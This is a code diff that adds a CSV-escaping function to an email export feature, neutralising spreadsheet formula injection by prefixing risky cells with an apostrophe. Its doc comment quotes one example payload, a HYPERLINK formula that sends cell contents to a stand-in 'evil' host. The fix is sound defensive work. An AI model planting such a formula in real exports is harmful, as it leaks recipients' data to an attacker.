@@ -34,6 +34,25 @@ function stamp(): string {
   return new Date().toISOString().replace(/[:.]/g, '-');
 }
 
+/**
+ * Neutralise spreadsheet formula injection in a CSV cell.
+ *
+ * Excel and Sheets evaluate a field that opens with `=`, `+`, `-`, `@`, tab, or
+ * CR as a formula. Subjects, bodies, and company names come from whatever landed
+ * in the user's inbox, so a crafted email could plant something like
+ * `=HYPERLINK("http://evil/?"&A1,"click")` that runs when the export is opened.
+ * Prefixing with an apostrophe keeps the value literal text.
+ *
+ * Only the CSV path needs this: ExcelJS writes strings as inline strings, which
+ * Excel never evaluates, and JSON is not a spreadsheet.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+function csvSafe(value: Cell): Cell {
+  if (typeof value !== 'string') return value;
+  return FORMULA_LEAD.test(value) ? `'${value}` : value;
+}
+
 function colWidth(header: string): number {
   if (header === 'Latest Body') return 60;
   return Math.max(18, Math.min(48, header.length + 12));
@@ -72,7 +91,7 @@ async function buildFile(
   if (format === 'csv') {
     const csv = Papa.unparse({
       fields: headers,
-      data: all.map((r) => headers.map((h) => r[h] ?? '')),
+      data: all.map((r) => headers.map((h) => csvSafe(r[h] ?? ''))),
     });
     return { filename: `${base}-${s}.csv`, contentType: 'text/csv', body: csv };
   }
